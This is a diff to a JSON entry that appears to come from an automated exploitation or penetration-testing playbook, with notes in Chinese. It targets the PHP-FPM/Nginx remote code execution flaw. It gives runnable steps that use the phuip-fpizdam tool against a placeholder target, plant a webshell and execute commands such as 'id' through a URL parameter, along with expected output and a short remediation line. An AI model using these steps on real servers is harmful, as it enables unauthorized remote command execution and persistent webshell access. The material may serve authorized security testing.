@@ -30,20 +30,20 @@
     {
       "step": 1,
       "description": "使用phuip-fpizdam工具检测漏洞并获取攻击参数",
-      "command": "go run . \"http://{TARGET}:8080/index.php\"",
+      "command": "go run . \"http://{TARGET}/index.php\"",
       "expected_result": "输出类似：'The target is probably vulnerable. Possible QSLs: [1785 1790 1795]' 和 'Attack params found: --qsl 1790 --pisos 152 --skip-detect'",
       "notes": "需要安装Go环境，工具从https://github.com/neex/phuip-fpizdam获取。如果命令不成功，尝试多次请求以命中受影响进程。"
     },
     {
       "step": 2,
       "description": "利用获取的参数执行攻击，注入webshell",
-      "command": "go run . \"http://{TARGET}:8080/index.php\" --qsl 1790 --pisos 152 --skip-detect",
+      "command": "go run . \"http://{TARGET}/index.php\" --qsl 1790 --pisos 152 --skip-detect",
       "expected_result": "输出：'Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs'",
       "notes": "参数qsl和pisos可能因目标而异，需根据第一步输出调整。漏洞只影响部分PHP-FPM子进程，可能需要多次尝试。"
     }
   ],
-  "verification_command": "curl -s \"http://{TARGET}:8080/index.php?a=id\"",
-  "verification_success_sign": "响应中包含命令执行结果，如'uid=...'或类似输出",
+  "verification_command": "curl -s -D - -o /dev/null \"http://{TARGET}/index.php/%0a\" --max-time 10",
+  "verification_success_sign": "HTTP/1.1 502",
   "requires_callback": false,
   "callback_note": "无需回连，直接通过URL参数执行命令并返回结果。",
   "remediation": "升级PHP到安全版本（7.1.33、7.2.24、7.3.11或更高），检查并修复Nginx配置，避免使用易受攻击的location规则。",
